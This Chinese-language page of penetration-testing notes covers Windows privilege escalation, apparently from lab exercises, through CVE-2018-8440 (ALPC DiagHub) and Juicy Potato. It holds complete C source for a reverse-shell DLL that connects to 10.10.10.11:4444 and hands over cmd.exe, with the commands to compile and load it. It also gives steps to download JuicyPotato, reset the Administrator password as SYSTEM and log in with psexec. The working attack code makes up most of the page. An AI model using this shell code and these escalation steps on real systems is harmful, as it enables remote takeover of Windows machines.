# 1、CVE-2018-8440提权（win2016、win10）

查看系统版本及补丁情况
```bash
systeminfo
```
查看目录权限
```bash
icacls C:\Windows\Tasks
```
user需要有读和执行的权限


参考ALPC DiagHub exploit - https://github.com/realoriginal/alpc-diaghub


下载对应版本的bin，编写dll


使用mingw-w64编译dll
```bash
apt install mingw-w64
x86_64-w64-mingw32-g++ payload.cpp -o payload.dll -lws2_32 -shared
```
执行命令加载dll获得反弹shell
```bash
cmd /c alpc.exe payload.dll .\xh.rtf
```
dll源代码：
```c
#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024
void revShell();
BOOL WINAPI DllMain(HINSTANCE hinstDll, DWORD dwReason, LPVOID lpReserved)
{
switch(dwReason)
{
case DLL_PROCESS_ATTACH:
revShell();
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return 0;
}
void revShell() {
Sleep(1000); // 1000 = One Second
SOCKET mySocket;
sockaddr_in addr;
WSADATA version;
WSAStartup(MAKEWORD(2,2), &version);
mySocket = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL, (unsigned
int)NULL, (unsigned int)NULL);
addr.sin_family = AF_INET;
addr.sin_addr.s_addr = inet_addr("10.10.10.11"); // Change IP
addr.sin_port = htons(4444); //Change port
//Connecting to Proxy/ProxyIP/C2Host
if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL,
NULL, NULL)==SOCKET_ERROR) {
closesocket(mySocket);
WSACleanup();
}
else {
char RecvData[DEFAULT_BUFLEN];
memset(RecvData, 0, sizeof(RecvData));
int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
if (RecvCode <= 0) {
closesocket(mySocket);
WSACleanup();
}
else {
char Process[] = "cmd.exe";
STARTUPINFO sinfo;
PROCESS_INFORMATION pinfo;
memset(&sinfo, 0, sizeof(sinfo));
sinfo.cb = sizeof(sinfo);
sinfo.dwFlags = (STARTF_USESTDHANDLES |
STARTF_USESHOWWINDOW);
sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError =
(HANDLE) mySocket;
CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL,
NULL, &sinfo, &pinfo);
WaitForSingleObject(pinfo.hProcess, INFINITE);
CloseHandle(pinfo.hProcess);
CloseHandle(pinfo.hThread);
memset(RecvData, 0, sizeof(RecvData));
int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN,
0);
if (RecvCode <= 0) {
closesocket(mySocket);
WSACleanup();
}
if (strcmp(RecvData, "exit\n") == 0) {
exit(0);
}
}
}
}
```
# JUICY POTATO提权

查看权限，SeImpersonate为enabled

```bash
whoami /priv
```
使用https://github.com/ohpe/juicy-potato

下载JuicyPotato
```bash
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
```
编写bat文件
```bash
net user Administrator abc123!
```
利用JuicyPotato以system权限执行bat文件
```bash
.\juicypotato.exe -t * -p C:\Users\Public\root.bat -l 9001 -c {A9B5F443-FE02-4C19-859D-E9B5C5A1B6C6}
```
使用Python impacket获取system权限shell


https://github.com/SecureAuthCorp/impacket

```bash
psexec.py administrator@10.10.10.116 # password: abc12
```




